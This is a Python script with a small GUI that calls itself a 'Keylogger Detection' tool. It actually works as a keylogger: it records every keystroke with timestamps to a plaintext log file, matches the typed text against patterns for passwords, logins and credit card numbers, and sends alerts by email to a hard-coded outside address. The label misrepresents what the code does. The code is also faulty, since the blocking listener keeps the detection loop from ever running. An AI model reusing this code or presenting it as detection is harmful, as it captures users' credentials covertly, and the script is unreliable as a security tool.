import pynput
import time
import logging
import smtplib
from email.mime.text import MIMEText
from plyer import notification
import re
from datetime import datetime
import tkinter as tk

# Setup logging
logging.basicConfig(filename='keylogger_detection.log', level=logging.INFO, format='%(asctime)s: %(message)s')

# Variable to collect all key presses
key_sequence = ""

# Function to log key press with timestamp
def on_press(key):
    global key_sequence
    try:
        # Append the character to the sequence
        key_sequence += key.char
        logging.info(f'Key pressed: {key.char} at {datetime.now()}')
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(f'Special key pressed: {key} at {datetime.now()}')
        if key == key.space:
            key_sequence += " "
        elif key == key.enter:
            key_sequence += "\n"

# Function to send email alert
def send_email_alert(suspicious_activity):
    sender = 'ammararsiwala068@gmail.com'
    recipient = 'madman.0333333@gmail.com'
    subject = 'Suspicious Activity Detected'
    body = f'Suspicious activity detected: {suspicious_activity}'

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = recipient

    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login(sender, 'your_password')
        server.sendmail(sender, recipient, msg.as_string())

# Function to show desktop notification
def show_desktop_notification(message):
    notification.notify(
        title="Keylogger Detection Alert",
        message=message,
        timeout=5  # seconds
    )

# Function to monitor and detect suspicious patterns using regex
def detect_keylogger():
    global key_sequence
    suspicious_patterns = [
        r'\bpassword\b',      # Detects the word "password"
        r'\bemail\b',         # Detects the word "email"
        r'\blogin\b',         # Detects the word "login"
        r'\busername\b',      # Detects the word "username"
        r'\bcredit card\b',   # Detects the phrase "credit card"
        r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b'  # Detects credit card numbers
    ]

    while True:
        time.sleep(5)  # Check every 5 seconds
        for pattern in suspicious_patterns:
            if re.search(pattern, key_sequence, re.IGNORECASE):
                print(f'Suspicious activity detected: {pattern}')
                send_email_alert(pattern)
                show_desktop_notification(f'Suspicious activity detected: {pattern}')
                key_sequence = ""  # Clear the sequence after detection

# Function to monitor keyboard activity
def monitor_keyboard():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# GUI for starting/stopping detection
def start_detection():
    print("Starting detection...")
    monitor_keyboard()
    detect_keylogger()

def stop_detection():
    print("Stopping detection...")
    root.quit()

# GUI Setup using tkinter
root = tk.Tk()
root.title("Keylogger Detection")

start_button = tk.Button(root, text="Start Detection", command=start_detection)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Detection", command=stop_detection)
stop_button.pack(pady=10)

root.mainloop()
